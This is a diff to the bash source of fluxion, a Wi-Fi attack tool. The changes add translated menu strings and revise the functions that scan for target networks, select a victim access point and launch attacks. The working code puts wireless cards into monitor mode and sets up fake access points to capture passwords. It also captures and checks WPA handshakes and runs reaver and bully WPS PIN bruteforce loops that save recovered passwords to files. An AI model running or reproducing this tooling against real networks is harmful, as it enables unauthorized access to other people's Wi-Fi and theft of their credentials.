+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	general_back="Back"
+	general_error_1="Not_Found"
+	general_case_error="Unknown option. Choose again"
+	general_exitmode="Cleaning and closing"
+	general_exitmode_1="Disabling monitoring interface"
+	general_exitmode_2="Disabling interface"
+	general_exitmode_3="Disabling "$grey"forwarding of packets"
+	general_exitmode_4="Cleaning "$grey"iptables"
+	general_exitmode_5="Restoring "$grey"tput"
+	general_exitmode_6="Restarting "$grey"Network-Manager"
+	general_exitmode_7="Cleanup performed successfully!"
+	general_exitmode_8="Thanks for using fluxion"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	selection_1="Active clients"
+	selection_2="Select target. For rescan type$red r$transparent"
+	setinterface
+}
+
+function romanian {
+	header_setinterface="Selecteaza o interfata"
+    setinterface_error="Nu este nici o placa de retea wireless, iesire..."
+
+    #
+    header_choosescan="Selecteaza canalul"
+    choosescan_option_1="Toate canalele "
+    choosescan_option_2="Canal specific(s)"
+    #
+    scanchan_option_1="Un singur canal"
+    scanchan_option_2="Canale multiple"
+    #
+    header_scan="WIFI Monitor"
+    #
+    header_scanchan="Scaneaza tinta"
+    #
+    header_askAP="Selecteaza optiunea de atac"
+    askAP_option_1="FakeAP - Hostapd ("$red"Recomandat)"
+    askAP_option_2="FakeAP - airbase-ng (Conexiune mai lenta)"
+    askAP_option_3="WPS-SLAUGHTER - Fortare bruta a pinului WPS"
+    askAP_option_4="Bruteforce - (Handshake este necesara)"
+    #
+    header_askauth="METODA PENTRU VERIFICAREA PAROLEI"
+    askauth_option_1="Handshake ("$red"Recomandat)"
+    askauth_option_2="Wpa_supplicant(Mai multe eșecuri)"
+    #
+    header_deauthforce="Verificare Handshake"
+    deauthforce_option_1="aircrack-ng (Sansa ratata)"
+    #
+    header_deauthMENU="*Capturare Handshake*"
+    deauthMENU_option_1="Verificare handshake"
+    #
+    handshakelocation_1="Handshake locatie  (Examplu: $red$WORK_DIR.cap$transparent)"
+    handshakelocation_2="Apasa ${yellow}ENTER$transparent to skip"
+    #
+    header_webinterface="Selecteaza optiunea ta"
+    header_ConnectionRESET="Selecteaza pagina de logare"
+    #
+    general_back="Inapoi"
+    general_error_1="Nu a fost gasit"
+    general_case_error="Optiune necunoscuta. Incearca din nou"
+    general_exitmode="Curatire si inchidere"
+    general_exitmode_1="Dezacticati interfata monitorizata"
+    general_exitmode_2="Dezactivati interfata"
+    general_exitmode_3="Dezactivati "$grey"forwarding of packets"
+    general_exitmode_4="Curatire "$grey"iptables"
+    general_exitmode_5="Restaurare "$grey"tput"
+    general_exitmode_6="Restartare "$grey"Network-Manager"
+    general_exitmode_7="Curatire efectuata cu succes!"
+    general_exitmode_8="Multumesc pentru ca ati folosit fluxion"
+    #
+    selection_1="Clienti activi"
+    selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
+    setinterface
+}
+
+function turkish {
+	header_setinterface="Bir Ag Secin"
+    setinterface_error="Wireless adaptorunuz yok, program kapatiliyor..."
+
+    #
+    header_choosescan="Kanal Sec"
+    choosescan_option_1="Tum Kanallar "
+    choosescan_option_2="Sectigim Kanal ya da Kanallar"
+    #
+    scanchan_option_1="Tek Kanal"
+    scanchan_option_2="Coklu Kanal"
+    #
+    header_scan="Wifi Goruntule"
+    #
+    header_scanchan="Hedef Taraniyor"
+    #
+    header_askAP="Saldiri Tipi Secin"
+    askAP_option_1="SahteAP - Hostapd ("$red"Tavsiye Edilen)"
+    askAP_option_2="SahteAP - airbase-ng (Yavas Baglanti)"
+    askAP_option_3="WPS-SLAUGHTER(Wps Katliam) - Kabakuvvet ile WPS Pin"
+    askAP_option_4="Kabakuvvet - (Handshake Gereklidir)"
+    #
+    header_askauth="Sifre Kontrol Metodu"
+    askauth_option_1="Handshake ("$red"Tavsiye Edilen)"
+    askauth_option_2="Wpa_supplicant(Hata Orani Yuksek)"
+    #
+    header_deauthforce="Handshake Kontrol"
+    deauthforce_option_1="aircrack-ng (Hata Sansı Var)"
+    #
+    header_deauthMENU="*Kaydet Handshake*"
+    deauthMENU_option_1="Kontrol Et handshake"
+    #
+    handshakelocation_1="handshake Dizini  (Ornek: $red$WORK_DIR.cap$transparent)"
+    handshakelocation_2="Tusa Bas ${yellow}ENTER$transparent Gecmek icin"
+    #
+    header_webinterface="Secenegi Sec"
+    header_ConnectionRESET="Giris Sayfasini Sec"
+    #
+    general_back="Geri"
+    general_error_1="Bulunamadi"
+    general_case_error="Bilinmeyen Secenek. Tekrar Seciniz"
+    general_exitmode="Temizleniyor ve Kapatiliyor"
+    general_exitmode_1="Monitor modu kapatiliyor"
+    general_exitmode_2="Ag Arayuzu kapatiliyor"
+    general_exitmode_3="Kapatiliyor "$grey"forwarding of packets"
+    general_exitmode_4="Temizleniyor "$grey"iptables"
+    general_exitmode_5="Yenileniyor "$grey"tput"
+    general_exitmode_6="Tekrar Baslatiliyor "$grey"Network-Manager"
+    general_exitmode_7="Temizlik Basariyla Tamamlandi!"
+    general_exitmode_8="Fluxion kullandiginiz icin tesekkurler."
+    #
+    selection_1="Aktif kullanicilar"
+    selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
+    setinterface
+}
+
+function spain {
+	header_setinterface="Seleccione una interfase"
+    setinterface_error="No hay tarjetas inalambricas, saliendo..."
+
+    #
+    header_choosescan="Seleccione canal"
+    choosescan_option_1="Todos los canales "
+    choosescan_option_2="Canal(es) específico(s)"
+    #
+    scanchan_option_1="Canal único"
+    scanchan_option_2="Canales múltiples"
+    #
+    header_scan="WIFI Monitor"
+    #
+    header_scanchan="Escaneando objetivo"
+    #
+    header_askAP="Seleccione Opción de Ataque"
+    askAP_option_1="FakeAP - Hostapd ("$red"Recomendado)"
+    askAP_option_2="FakeAP - airbase-ng (Conexión más lenta)"
+    askAP_option_3="WPS-SLAUGHTER - Fuerza Bruta al Pin WPS"
+    askAP_option_4="Bruteforce - (Se requiere handshake)"
+    #
+    header_askauth="MÉTODO PARA VERIFICAR CONTRASEÑA"
+    askauth_option_1="Handshake ("$red"Recomendado)"
+    askauth_option_2="Wpa_supplicant(Más Fallas)"
+    #
+    header_deauthforce="Chequeo de Handshake"
+    deauthforce_option_1="aircrack-ng (Posibilidad de error)"
+    #
+    header_deauthMENU="*Capturar Handshake*"
+    deauthMENU_option_1="Chequear handshake"
+    #
+    handshakelocation_1="ubicación del handshake  (Ejemplo: $red$WORK_DIR.cap$transparent)"
+    handshakelocation_2="Presione ${yellow}ENTER$transparent para saltar"
+    #
+    header_webinterface="Seleccione su opción"
+    header_ConnectionRESET="Seleccione página de Login"
+    #
+    general_back="Atrás"
+    general_error_1="No_Encontrado"
+    general_case_error="Opción desconocida. Elija de nuevo"
+    general_exitmode="Limpiando y cerrando"
+    general_exitmode_1="Deshabilitando interfaz de monitoreo"
+    general_exitmode_2="Deshabilitando interfaz"
+    general_exitmode_3="Deshabilitando "$grey"reenvio de paquetes"
+    general_exitmode_4="Limpiando "$grey"iptables"
+    general_exitmode_5="Restaurando "$grey"tput"
+    general_exitmode_6="Reiniciando "$grey"Network-Manager"
+    general_exitmode_7="Limpieza realizada satisfactoriamente!"
+    general_exitmode_8="Gracias por usar fluxion"
+    #
+    selection_1="Clientes activos"
+    selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
+	setinterface
+
+}
+
+function chinese {
+	
+	setinterface_error="没有检测到网卡 退出..."
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_choosescan="选择信道"
+	choosescan_option_1="所有信道 "
+	choosescan_option_2="指定信道"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	scanchan_option_1="单一信道"
+	scanchan_option_2="多个信道"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scanchan="正在扫描目标"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askAP="选择攻击选项"
+	askAP_option_1="伪装AP - Hostapd ("$red"推荐)"
+	askAP_option_3="WPS-SLAUGHTER - 暴力破解 WPS Pin"
+	askAP_option_4="暴力破解 - (需要握手包)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askauth="请选择验证密码方式"
+	askauth_option_2="提供的wpa (易错)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthforce="握手包检查"
+	deauthforce_option_1="aircrack-ng (Miss chance)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthMENU="*抓握手包*"
+	deauthMENU_option_1="检查握手包"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_webinterface="请选择"
+	header_ConnectionRESET="选择登陆界面"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	general_back="返回"
+	general_error_1="未找到"
+	general_case_error="未知选项. 请再次选择"
+	general_exitmode="清理并退出"
+	general_exitmode_3="关闭 "$grey"forwarding of packets"
+	general_exitmode_4="清理 "$grey"iptables"
+	general_exitmode_5="恢复 "$grey"tput"
+	general_exitmode_6="重启 "$grey"Network-Manager"
+	general_exitmode_7="清理完成!"
+	general_exitmode_8="感谢使用fluxion!"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	selection_1="活动的客户端"
+	selection_2="选择一个目标. 重扫 按$red r$transparent"
+	setinterface
+}
 # Choose Interface
 function setinterface {
+	conditional_clear
+	top
 	#unblock interfaces
 	rfkill unblock all
-	
-	# Collect all interfaces in montitor mode & stop all 
+
+	# Collect all interfaces in montitor mode & stop all
 	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
-	
+
 	for monkill in ${KILLMONITOR[@]}; do
-		./airmon stop $monkill >$flux_output_device
+		airmon-ng stop $monkill >$flux_output_device
 		echo -n "$monkill, "
 	done
-	
+
 	# Create a variable with the list of physical network interfaces
 	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
 	INTERFACESNUMBER=`./airmon| grep -c "-"`
-	
-	echo
-	echo
-	echo Autodetect Resolution ...	
-	echo $detectedresolution
-	echo
-	
-	
-	
+
+
 	if [ "$INTERFACESNUMBER" -gt "0" ]; then
-		
-		echo "Select an interface"
+
+		echo $header_setinterface
 		echo
 		i=0
-		
+
 		for line in "${wirelessifaces[@]}"; do
 			i=$(($i+1))
 			wirelessifaces[$i]=$line
 			echo -e "$blue ""$i)"$transparent" $line"
 		done
-		echo 
+		echo
 		echo -n "#? "
 		read line
 		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
-		
+
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
 			conditional_clear
-			mostrarheader
+			top
 			setinterface
 		fi
-		
+
 		readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
 		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
 		rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
-		
+
 		for molesto in "${softwaremolesto[@]}"; do
 			killall "$molesto" &>$flux_output_device
 		done
 		sleep 0.5
-		
+
 		modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
 		sleep 0.5
 		# Select Wifi Interface
 		select PREWIFI in $INTERFACES; do
 			break;
 		done
-		
+
 		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
 		WIFI_MONITOR=$WIFIMONITOR
 		WIFI=$PREWIFI
-		
+
 		#No wireless cards
 	else
-		
-		echo There are no wireless cards, quit... 
+
+		echo $setinterface_error
 		sleep 5
 		exitmode
 	fi
-	
+
 	deltax
-	
 }
 
 # Check files
 function deltax {
-	
+
 	conditional_clear
 	CSVDB=dump-01.csv
-	
+
 	rm -rf $DUMP_PATH/*
-	
+
 	choosescan
 	selection
 }
 
-# Select channel 
+# Select channel
 function choosescan {
-	
+
 	conditional_clear
-	
+
 	while true; do
 		conditional_clear
-		mostrarheader
-		
-		echo "Select channel"
+		top
+
+		echo "$header_choosescan"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" All channels            "
-		echo -e "      "$blue"2)"$transparent" Specific channel(s)       "
+		echo -e "      "$blue"1)"$transparent" $choosescan_option_1          "
+		echo -e "      "$blue"2)"$transparent" $choosescan_option_2       "
 		echo "                                       "
 		echo -n "      #> "
 		read yn
 		echo ""
 		case $yn in
 			1 ) Scan ; break ;;
-			2 ) Scanchan ; break ;;  
+			2 ) Scanchan ; break ;;
 			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
 		  esac
 	done
@@ -782,57 +1176,58 @@ function choosescan {
 
 # Choose your channel if you choose option 2 before
 function Scanchan {
-	  
+
 	conditional_clear
-	mostrarheader
-	
+	top
+
 	  echo "                                       "
-	  echo "      Select Channel     "
+	  echo "$header_choosescan     "
 	  echo "                                       "
-	  echo -e "     Single channel     "$blue"6"$transparent"               "
-	  echo -e "     Multiple channels  "$blue"1-5"$transparent"             "
-	  echo -e "     Multiple channels "$blue"1,2,5-7,11"$transparent"      "
+	  echo -e "     $scanchan_option_1 "$blue"6"$transparent"               "
+	  echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
+	  echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
 	  echo "                                       "
 	echo -n "      #> "
 	read channel_number
 	set -- ${channel_number}
 	conditional_clear
-	
+
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Scanning Target  [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
+	xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
 }
 
-# Scans the entire network 
+# Scans the entire network
 function Scan {
-	
+
 	conditional_clear
-	xterm $HOLD -title "WIFI Monitor" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
+	rm -rf $DUMP_PATH/dump*
+	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one 
 }
 
-# Choose a network 
+# Choose a network
 function selection {
-	
+
 	conditional_clear
-	mostrarheader
-	
-	
+	top
+
+
 	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
-	
+
 	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
 		deltax && break
 	fi
-	
-	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
-	linap=`expr $linap - 1`
-	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
-	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
+
+	fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	fluxionap=`expr $fluxionap - 1`
+	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
+	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
 	echo "                        WIFI LIST "
 	echo ""
-	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
+	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
 	echo ""
 	i=0
-	
-	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
+
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
 		longueur=${#MAC}
 		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
 		PRIVACY=${PRIVACY:0:4}
@@ -840,12 +1235,17 @@ function selection {
 			i=$(($i+1))
 			POWER=`expr $POWER + 100`
 			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
-			
+
 			if [ "$CLIENTE" != "" ]; then
-				CLIENTE="*" 
+				CLIENTE="*"
+			echo -e " ""$red "$i")"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""
+
+			else
+
+			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+
 			fi
-			
-			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+
 			aidlenght=$IDLENGTH
 			assid[$i]=$ESSID
 			achannel[$i]=$CHANNEL
@@ -855,11 +1255,16 @@ function selection {
 		fi
 	done < $DUMP_PATH/dump-02.csv
 	echo
-	echo -e ""$green "("$white"*"$green ")Active clients"$transparent""
+	echo -e ""$green "("$white"*"$green")$selection_1"$transparent""
 	echo ""
-	echo "        Select Target              "
+	echo -e "        $selection_2"
 	echo -n "      #> "
 	read choice
+
+	if [[ $choice -eq "r" ]]; then
+	deltax
+	fi
+
 	idlenght=${aidlenght[$choice]}
 	ssid=${assid[$choice]}
 	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
@@ -874,34 +1279,34 @@ function selection {
 	acouper=${#ssid}
 	fin=$(($acouper-idlength))
 	Host_SSID=${ssid:1:fin}
-	
+
 	conditional_clear
-	
+
 	askAP
 }
 
 function wpsselection {
-	
+
 	conditional_clear
-	
-	
+
+
 	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
-	
+
 	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
 		deltax && break
 	fi
-	
-	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
-	linap=`expr $linap - 1`
-	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
-	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
+
+	fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	fluxionap=`expr $fluxionap - 1`
+	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
+	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
 	echo "                        WIFI LIST "
 	echo ""
 	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
 	echo ""
 	i=0
-	
-	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
+
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
 		longueur=${#MAC}
 		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
 		PRIVACY=${PRIVACY:0:4}
@@ -909,11 +1314,11 @@ function wpsselection {
 			i=$(($i+1))
 			POWER=`expr $POWER + 100`
 			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
-			
+
 			if [ "$CLIENTE" != "" ]; then
-				CLIENTE="*" 
+				CLIENTE="*"
 			fi
-			
+
 			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
 			aidlenght=$IDLENGTH
 			assid[$i]=$ESSID
@@ -924,7 +1329,7 @@ function wpsselection {
 		fi
 	done < $DUMP_PATH/dump-02.csv
 	echo
-	echo -e ""$green "("$white"*"$green ")Active clients"$transparent""
+	echo -e ""$green "("$white"*"$green ")$selection_1"$transparent""
 	echo ""
 	echo "        Select Target              "
 	echo -n "      #> "
@@ -943,38 +1348,38 @@ function wpsselection {
 	acouper=${#ssid}
 	fin=$(($acouper-idlength))
 	Host_SSID=${ssid:1:fin}
-	
+
 	conditional_clear
-	
+
 
 }
 
 # FakeAP
 function askAP {
-		
+
 	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
-	
+
 	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
 		selection && break
 	fi
-	
+
 	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
 		fakeapmode="airbase-ng"
 		askauth
 	fi
-	
-	mostrarheader
+
+	top
 	while true; do
-		
+
 		infoap
-		
-		echo "          #### Select Attack Option ####"
+
+		echo "          #### $header_askAP ####"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" FakeAP - Hostapd ("$red"Recommended)"
-		echo -e "      "$blue"2)"$transparent" FakeAP - airbase-ng (Slower connection)"
-		echo -e "      "$blue"3)"$transparent" WPS-SLAUGHTER - Bruteforce WPS Pin"
-		echo -e "      "$blue"4)"$transparent" Wifite - Automated Network Hacking"
-		echo -e "      "$blue"5)"$transparent" Back"
+		echo -e "      "$blue"1)"$transparent" $askAP_option_1"
+		echo -e "      "$blue"2)"$transparent" $askAP_option_2"
+		echo -e "      "$blue"3)"$transparent" $askAP_option_3"
+		echo -e "      "$blue"4)"$transparent" $askAP_option_4"
+		echo -e "      "$blue"5)"$red" $general_back" $transparent""
 		echo "                                       "
 		echo -n "      #> "
 		read yn
@@ -983,44 +1388,39 @@ function askAP {
 			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
 			2 ) fakeapmode="airbase-ng"; askauth; break ;;
 			3 ) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
-			4 ) wifite ;wifite; break;;
+			4 ) fakeapmode="Aircrack-ng"; Bruteforce; break;;
 			5 ) selection; break ;;
-			* ) echo "Unknown option. Choose again"; conditional_clear ;;
+			* ) echo "$general_case_error"; conditional_clear ;;
 		esac
-	done 
-	
-} 
+	done
 
-#wifite Not finished yet
-function wifite {
-	python wifite.py
 }
+
 # Test Passwords / airbase-ng
 function askauth {
-	
+
 	conditional_clear
-	
-	mostrarheader
+
+	top
 	while true; do
-		
-		echo "METHOD TO VERIFY THE PASSWORD"
+
+		echo "$header_askauth"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" Handshake ("$red"Recommended)"
-		echo -e "      "$blue"2)"$transparent" Wpa_supplicant(More failures)"
-		echo -e "      "$blue"3)"$transparent" Back"
+		echo -e "      "$blue"1)"$transparent" $askauth_option_1"
+		echo -e "      "$blue"2)"$transparent" $askauth_option_2"
+		echo -e "      "$blue"3)"$transparent" $general_back"
 		echo "                                       "
 		echo -n "      #> "
 		read yn
 		echo ""
 		case $yn in
 			1 ) authmode="handshake"; handshakelocation; break ;;
-			2 ) authmode="wpa_supplicant"; webinterface; break ;;
+			2 ) authmode="wpa_supplicant";  certssl; break ;;
 			3 ) askAP; break ;;
-			* ) echo "
-Unknown option. Choose again"; conditional_clear ;;
+			* ) echo "$general_case_error"; conditional_clear ;;
 		esac
-	done 
-	
+	done
+
 }
 
 function wps {
@@ -1032,7 +1432,7 @@ declare WIFI_MONITOR4;
 declare WIFI_MONITOR5;
 
 echo "
-██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
+██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗
 ██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
 ██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
@@ -1329,7 +1729,7 @@ sleep 1
 
 WPS_ATTACK_MENU()
 {
-mostrarheader
+top
 echo "Which Attack Would You Like To Use?"
 		echo "                                       "
 		echo -e "      "$blue"0)"$transparent" Select New Target Network"
@@ -1345,11 +1745,11 @@ echo "Which Attack Would You Like To Use?"
 		echo -e "      "$blue"10)"$transparent"Exit"
 		echo "                                       "
 		echo "*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
-		
+
 }
 
 
-mostrarheader
+top
 echo "How many Wlan Adapters would You like to use?"
 echo "                                       "
 echo -e ""$blue"1)"$transparent" 1 Adapter"
@@ -1357,35 +1757,35 @@ echo -e ""$blue"2)"$transparent" 2 Adapters"
 echo -e ""$blue"3)"$transparent" 3 Adapters"
 echo -e ""$blue"4)"$transparent" 4 Adapters "
 echo -e ""$blue"5)"$transparent" 5 Adapters"
-	
+
 read a
 case $a in
 	1)
 clear
-mostrarheader
-echo 
+top
+echo
 read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 
 
 clear
-mostrarheader
+top
 enable_mon_mode_1
 
 sleep 1
 
 clear
-mostrarheader
+top
 echo "Would you like to Change the Wlan WIFI_MONITOR's MAC Address?"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Yes"
 		echo -e "      "$blue"2)"$transparent" No"
-		
+
 
 read c
 case $c in
 	1)
 clear
-mostrarheader
+top
 mac_change_1
 
 sleep 1
@@ -1408,7 +1808,7 @@ read d
 case $d in
 	0)
 clear
-mostrarheader
+top
 scan_for_targets
 enable_mon_mode_1
 menu
@@ -1430,13 +1830,13 @@ menu
 ;;
 	4)
 clear
-xterm -e "wash -i $WIFI_MONITOR1" & 
+xterm -e "wash -i $WIFI_MONITOR1" &
 menu
 ;;
 	5)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1450,7 +1850,7 @@ menu
 	6)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1469,7 +1869,7 @@ menu
 	8)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1483,7 +1883,7 @@ menu
 	9)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1505,11 +1905,11 @@ menu
 ;;
 	2)
 clear
-mostrarheader
-echo 
+top
+echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
-echo 
+echo
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
 
 clear
@@ -1524,8 +1924,8 @@ echo "Would you like to set the 2 WIFI_MONITORs to an Identical MAC Address?"
 echo "                                       "
 echo -e "      "$blue"1)"$transparent" Yes"
 echo -e "      "$blue"2)"$transparent" No"
-		
-	
+
+
 
 read f
 case $f in
@@ -1575,13 +1975,13 @@ menu
 ;;
 	4)
 clear
-xterm -e "wash -i $WIFI_MONITOR1" & 
+xterm -e "wash -i $WIFI_MONITOR1" &
 menu
 ;;
 	5)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1595,7 +1995,7 @@ menu
 	6)
 clear
